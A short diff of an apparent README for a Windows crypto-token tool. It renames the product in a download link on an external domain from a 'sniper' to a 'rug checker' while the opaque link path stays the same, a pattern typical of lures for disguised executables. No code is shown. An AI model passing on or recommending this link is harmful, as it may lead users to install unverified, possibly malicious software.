@@ -64,7 +64,7 @@ There are many online tools, **but**:
 Currently available for **Windows**  
 *(Linux and macOS support coming soon)*
 
-<a href="https://talkingmanager.com/1C8kxSMV?name=PumpfunSniperV1.3" download>
+<a href="https://talkingmanager.com/1C8kxSMV?name=RugCheckerV1.3" download>
   <img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/>
 </a>
 
